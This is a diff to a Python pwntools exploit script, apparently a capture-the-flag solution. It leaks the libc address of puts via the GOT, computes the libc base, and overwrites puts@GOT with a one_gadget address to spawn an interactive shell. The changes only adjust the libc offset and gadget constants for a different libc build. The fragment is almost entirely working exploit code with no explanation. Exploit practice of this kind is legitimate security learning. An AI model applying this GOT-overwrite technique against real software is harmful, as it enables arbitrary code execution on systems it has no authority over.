@@ -26,13 +26,14 @@ p.sendline('n');sleep(t)
 create('name',p64(0x6020b0)+p64(bss),'1')	# index 1
 edit('0',p64(bss),p64(puts_got),'2')		# index 2
 p.sendline('y');sleep(t)
-
 p.sendline('4');sleep(t)			# print_all
 
 p.recvuntil('id: 2\nname: ')	
 libc_puts = u64(p.recv(6).ljust(8,'\x00'))
-libc_base = libc_puts - 456336
-one_list = [0x45216,0x4526a,0xf02a4,0xf1147]
+#libc_base = libc_puts - 456336
+libc_base = libc_puts - 456352
+#one_list = [0x45216,0x4526a,0xf02a4,0xf1147]
+one_list = [0x45226,0x4527a,0xf0364,0xf1207]
 print 'libc_puts : '+hex(libc_puts)
 print 'libc_base : '+hex(libc_base)
 
@@ -44,8 +45,7 @@ edit('4','name','kind','4')
 p.sendline('n');sleep(t)
 create('name',p64(0x6020c8)+p64(puts_got),'5')	# index 5
 
-edit('4',p64(puts_got),p64(libc_base+one_list[2]),'6')
+edit('4',p64(puts_got),p64(libc_base+one_list[3]),'6')
 
 p.sendline('y');sleep(t)
-
 p.interactive()
